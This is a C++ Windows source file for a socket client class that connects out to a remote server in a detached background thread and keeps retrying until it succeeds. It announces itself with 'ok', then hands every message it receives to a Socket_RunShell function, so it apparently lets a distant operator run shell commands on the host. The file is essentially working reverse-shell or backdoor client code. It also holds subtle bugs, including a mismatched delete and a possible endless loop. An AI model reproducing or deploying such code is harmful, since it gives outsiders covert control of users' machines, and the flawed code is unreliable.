#include <Weteoes/Loading.h>
#ifndef CSocketClass_CPP
#define CSocketClass_CPP
#include "CSocket.h"

int CSocketClass::Entrance() {
	if (!hasThread) {
		hasThread = true; // 标记为线程启动
		Loading();
		std::thread a(&CSocketClass::SocketStart, this); a.detach(); // 分离了线程所以不标记为关闭
		//SocketStopFlac = false; // Socket开始
		//hasThread = false; // 标记为线程关闭
	}
	return 0;
}
void CSocketClass::SocketStart() {
	WSADATA wsaData;
	WSAStartup(0x0202, &wsaData);
	SOCKET tempClient = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); //创建客户端套节字
	SOCKADDR_IN server = Socket_Initialization();

	/* Connect */
	int result; //返回
	while (!SocketStopFlac) {
		result = connect(tempClient, (struct sockaddr*) & server, sizeof(SOCKADDR_IN)); //连接
		if (result == SOCKET_ERROR) {
			int err = WSAGetLastError();
			if (err == WSAEWOULDBLOCK || err == WSAEINVAL) {
				Sleep(3000);
				continue;
			}
			else if (err == WSAEISCONN) { break; } //处于连接状态
			else {
				Sleep(3000);
				continue;
			}
		}
	}

	/* Send */
	std::string SendStr = GetFirstSendData(); //获取用户字符串(加入分割符)
	if (Send_Socket(tempClient, SendStr)) { sClient = tempClient; } // 如果成功就放入全局变量
	else if (!SocketStopFlac) { goto GOTOresetSocket; } //失败重试

	if (!SocketStopFlac) {
		/* While Recv */
		std::thread RecvSocket(&CSocketClass::Recv_Socket_While, this, sClient); RecvSocket.detach(); //循环Send

		/* While Send */
		std::thread SendSocket(&CSocketClass::Send_Socket_While, this, sClient); SendSocket.detach();

		while (!SocketStopFlac) {
			Sleep(1000);
		}
	}

	/* Reset Socket */
	if (0) { // 如果需要重新连接
	GOTOresetSocket:
		Sleep(1000);
		SocketStart();
	}

	/* Stop Socket */
	SocketStop(sClient);
	hasThread = false; // 线程结束
	SocketStopFlac = false; // 重试
	WSACleanup();
}
void CSocketClass::SocketStop(SOCKET socket) {
	// 释放连接和进行结束工作      
	closesocket(socket);
	socket = NULL;
}
void CSocketClass::Recv_Socket_While(SOCKET socket) {
	while (!SocketStopFlac) {
		std::vector<std::string> Recv_Cache;
		if (!Recv_Socket(socket, &Recv_Cache)) { SocketStopFlac = true; break; } // 退出线程
		if (Recv_Cache.empty()) { continue; }
		for (std::string data : Recv_Cache) {
			Socket_RunShell(data);
		}
	}
}
bool CSocketClass::Send_Socket(SOCKET socket, std::string data) {
	int result; //send result
	while (true) {
		if (w) { data = flac_Start + data + flac_End; } // 需要根据w规则
		result = send(socket, data.c_str(), (int)data.size(), 0); //发送数据
		if (result == SOCKET_ERROR) {
			int err = WSAGetLastError();
			if (err == WSAEWOULDBLOCK) {
				Sleep(100);
				continue;
			}
			else { //发送失败
				//SocketStop(socket);
				return false;
			}
		}
		return true;
	}
}
bool CSocketClass::Recv_Socket(SOCKET socket, std::vector<std::string>* allResult) {
	/* Initialization */
	int result; // , result_old = 0; //recv result   [result_old 用于检测服务器是否异常退出]
	int ConfigCache = socketCache; //配置的缓存大小
	char* result_byte = new char[ConfigCache]; //缓存数据byte
	std::string allData = ""; //已经接收数据
	ULONG MoreLen; //剩下的数据大小

	/* While Reve */
W_recv:
	while (true) {
		result = recv(socket, result_byte, ConfigCache - 1, 0); //接收数据(需要添加结束标记所以-1)
		//if (result_old == 0 && result == 0) { return false; }
		//result_old = result; // 记录上次获取的长度
		if (result == SOCKET_ERROR) {
			int err = WSAGetLastError();
			if (err == WSAEWOULDBLOCK) { continue; }
			else { return false; } //接收失败
		}
		// 是否有临时数据
		if (!recvTemp.empty()) { allData = recvTemp; recvTemp = ""; }
		/* Recv */
		result_byte[result] = 0x00; //添加结束标记
		allData += std::string(result_byte, result); //Cache >> AllResult
		memset(result_byte, 0, ConfigCache); //清空之前的数据
		ioctlsocket(socket, FIONREAD, &MoreLen); //检查剩下的数据
		if (MoreLen == 0) { //接收完毕
			// 需要根据w规则
			if (w) {
				int findStart, findEnd;
				while ((findStart = (int)allData.find(flac_Start)) != -1 && findStart < allData.length() && (findEnd = (int)allData.find(flac_End, findStart)) != -1) {
					// 先放数据，再修改数据
					int subStart = findStart + (int)flac_Start.length();
					std::string onlyData = allData.substr(subStart, findEnd - subStart);
					if (onlyData.empty()) { continue; }
					while (true) { // 如果数据包错乱，丢掉前面一个包
						int findStart_ = (int)onlyData.find(flac_Start);
						if (findStart_ == -1) { break; }
						onlyData = onlyData.substr(findStart_ + (int)flac_Start.length());
					}
					allResult->push_back(onlyData);
					allData = allData.substr(findEnd + flac_End.length());
				}
				// 如果还有临时数据就存起来(没必要判断)
				recvTemp = allData;
				if (!allResult->empty()) { goto W_success; }
			}
			// 不需要根据w规则
			else {
				allResult->push_back(allData);
				goto W_success;
			}
		}
		goto W_recv;
	}
W_success:
	delete result_byte;
	return true;
}
std::string CSocketClass::GetIpByName(std::string a) {
	std::string result = "";
	struct addrinfo hints;
	struct addrinfo* res;
	struct sockaddr_in* addr;
	char ipbuf[16];
	memset(&hints, 0, sizeof(struct addrinfo));
	hints.ai_family = AF_INET; /* Allow IPv4 */
	hints.ai_flags = AI_PASSIVE; /* For wildcard IP address */
	hints.ai_protocol = 0; /* Any protocol */
	hints.ai_socktype = SOCK_STREAM;
	int i = getaddrinfo(a.c_str(), NULL, &hints, &res);
	if (i == -1) { return ""; }
	if (res == NULL) { return ""; }
	addr = (struct sockaddr_in*)res->ai_addr;
	return inet_ntop(AF_INET, &addr->sin_addr, ipbuf, 16);
}
std::string CSocketClass::GetFirstSendData() {
	return "ok";
}
#endif